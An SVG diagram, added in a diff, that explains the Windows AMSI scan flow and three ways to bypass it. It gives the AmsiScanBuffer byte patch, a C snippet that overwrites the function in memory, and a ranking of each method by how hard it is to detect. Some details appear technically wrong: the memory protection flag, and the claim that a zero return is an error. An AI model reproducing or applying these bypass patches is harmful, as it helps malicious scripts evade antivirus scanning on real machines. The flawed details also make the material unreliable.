@@ -1,0 +1,80 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 580" font-family="'Segoe UI', Consolas, monospace">
+  <defs>
+    <linearGradient id="bg" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#0d1117"/><stop offset="100%" stop-color="#161b22"/></linearGradient>
+    <marker id="ar" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto"><polygon points="0 0,10 3.5,0 7" fill="#f0883e"/></marker>
+    <marker id="ag" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto"><polygon points="0 0,10 3.5,0 7" fill="#3fb950"/></marker>
+  </defs>
+  <rect width="1000" height="580" fill="url(#bg)"/>
+  <text x="500" y="32" text-anchor="middle" fill="#58a6ff" font-size="17" font-weight="bold">AMSI Scan Flow &amp; Bypass Patch Points</text>
+
+  <!-- Normal AMSI flow -->
+  <text x="50" y="60" fill="#8b949e" font-size="12">Normal Flow:</text>
+
+  <rect x="30" y="70" width="140" height="50" rx="6" fill="#0d1117" stroke="#58a6ff" stroke-width="2"/>
+  <text x="100" y="100" text-anchor="middle" fill="#58a6ff" font-size="10">PowerShell.exe</text>
+  <line x1="175" y1="95" x2="205" y2="95" stroke="#f0883e" stroke-width="2" marker-end="url(#ar)"/>
+
+  <rect x="210" y="70" width="140" height="50" rx="6" fill="#0d1117" stroke="#f0883e" stroke-width="2"/>
+  <text x="280" y="92" text-anchor="middle" fill="#f0883e" font-size="10">AmsiInitialize()</text>
+  <text x="280" y="107" text-anchor="middle" fill="#8b949e" font-size="8">Create context</text>
+  <line x1="355" y1="95" x2="385" y2="95" stroke="#f0883e" stroke-width="2" marker-end="url(#ar)"/>
+
+  <rect x="390" y="70" width="155" height="50" rx="6" fill="#0d1117" stroke="#f85149" stroke-width="2"/>
+  <text x="467" y="92" text-anchor="middle" fill="#f85149" font-size="10">AmsiScanBuffer()</text>
+  <text x="467" y="107" text-anchor="middle" fill="#8b949e" font-size="8">Scan content</text>
+  <line x1="550" y1="95" x2="580" y2="95" stroke="#f0883e" stroke-width="2" marker-end="url(#ar)"/>
+
+  <rect x="585" y="70" width="155" height="50" rx="6" fill="#0d1117" stroke="#d2a8ff" stroke-width="2"/>
+  <text x="662" y="92" text-anchor="middle" fill="#d2a8ff" font-size="10">AMSI Provider</text>
+  <text x="662" y="107" text-anchor="middle" fill="#8b949e" font-size="8">Defender / 3rd party</text>
+  <line x1="745" y1="95" x2="775" y2="95" stroke="#f0883e" stroke-width="2" marker-end="url(#ar)"/>
+
+  <rect x="780" y="70" width="190" height="50" rx="6" fill="#0d1117" stroke="#f85149" stroke-width="2"/>
+  <text x="875" y="92" text-anchor="middle" fill="#f85149" font-size="10">AMSI_RESULT_DETECTED</text>
+  <text x="875" y="107" text-anchor="middle" fill="#f85149" font-size="8">Script blocked!</text>
+
+  <!-- Patch points -->
+  <text x="50" y="155" fill="#3fb950" font-size="13" font-weight="bold">Bypass Patch Points:</text>
+
+  <!-- Patch 1: AmsiScanBuffer -->
+  <rect x="30" y="170" width="300" height="140" rx="8" fill="#0d1117" stroke="#3fb950" stroke-width="2"/>
+  <text x="180" y="193" text-anchor="middle" fill="#3fb950" font-size="12" font-weight="bold">Patch 1: AmsiScanBuffer</text>
+  <text x="50" y="218" fill="#c9d1d9" font-size="10">Overwrite first bytes:</text>
+  <text x="55" y="238" fill="#ff7b72" font-size="10">Before: 4C 8B DC 49 89 5B 08</text>
+  <text x="55" y="258" fill="#7ee787" font-size="10">After:  B8 57 00 07 80 C3</text>
+  <text x="55" y="278" fill="#8b949e" font-size="9">mov eax, 0x80070057; ret</text>
+  <text x="55" y="298" fill="#3fb950" font-size="9">Returns E_INVALIDARG — scan skipped</text>
+
+  <!-- Patch 2: AmsiOpenSession -->
+  <rect x="350" y="170" width="300" height="140" rx="8" fill="#0d1117" stroke="#d2a8ff" stroke-width="2"/>
+  <text x="500" y="193" text-anchor="middle" fill="#d2a8ff" font-size="12" font-weight="bold">Patch 2: AmsiOpenSession</text>
+  <text x="370" y="218" fill="#c9d1d9" font-size="10">Corrupt session handle:</text>
+  <text x="375" y="238" fill="#c9d1d9" font-size="10">Force function to return</text>
+  <text x="375" y="258" fill="#c9d1d9" font-size="10">error before scanning</text>
+  <text x="375" y="278" fill="#7ee787" font-size="10">xor eax, eax; ret</text>
+  <text x="375" y="298" fill="#d2a8ff" font-size="9">No valid session = no scans</text>
+
+  <!-- Patch 3: Context corruption -->
+  <rect x="670" y="170" width="305" height="140" rx="8" fill="#0d1117" stroke="#f0883e" stroke-width="2"/>
+  <text x="822" y="193" text-anchor="middle" fill="#f0883e" font-size="12" font-weight="bold">Patch 3: Context Corruption</text>
+  <text x="690" y="218" fill="#c9d1d9" font-size="10">amsiContext→amsiSession = 0</text>
+  <text x="690" y="238" fill="#c9d1d9" font-size="10">Null out AMSI context</text>
+  <text x="690" y="258" fill="#c9d1d9" font-size="10">header field check:</text>
+  <text x="695" y="278" fill="#7ee787" font-size="10">if (ctx[0] != 'AMSI') fail</text>
+  <text x="690" y="298" fill="#f0883e" font-size="9">Corrupted header = scan bypass</text>
+
+  <!-- Detection surface -->
+  <rect x="30" y="335" width="940" height="100" rx="8" fill="#161b22" stroke="#30363d"/>
+  <text x="50" y="360" fill="#58a6ff" font-size="13" font-weight="bold">Detection Surface per Technique</text>
+  <text x="50" y="385" fill="#3fb950" font-size="10">AmsiScanBuffer patch: Detected by byte signature, but works universally</text>
+  <text x="50" y="405" fill="#d2a8ff" font-size="10">AmsiOpenSession patch: Less detected, same effect, fewer signatures</text>
+  <text x="50" y="425" fill="#f0883e" font-size="10">Context corruption: No code modification, data-only — hardest to detect</text>
+
+  <!-- Code example -->
+  <rect x="30" y="450" width="940" height="115" rx="8" fill="#0d1117" stroke="#30363d"/>
+  <text x="50" y="475" fill="#58a6ff" font-size="12" font-weight="bold">Classic AmsiScanBuffer Patch (C)</text>
+  <text x="50" y="498" fill="#7ee787" font-size="10">HMODULE amsi = LoadLibraryA("amsi.dll");</text>
+  <text x="50" y="516" fill="#7ee787" font-size="10">void* addr = GetProcAddress(amsi, "AmsiScanBuffer");</text>
+  <text x="50" y="534" fill="#7ee787" font-size="10">DWORD old; VirtualProtect(addr, 6, PAGE_READWRITE, &amp;old);</text>
+  <text x="50" y="552" fill="#7ee787" font-size="10">memcpy(addr, "\xB8\x57\x00\x07\x80\xC3", 6);  // mov eax, E_INVALIDARG; ret</text>
+</svg>
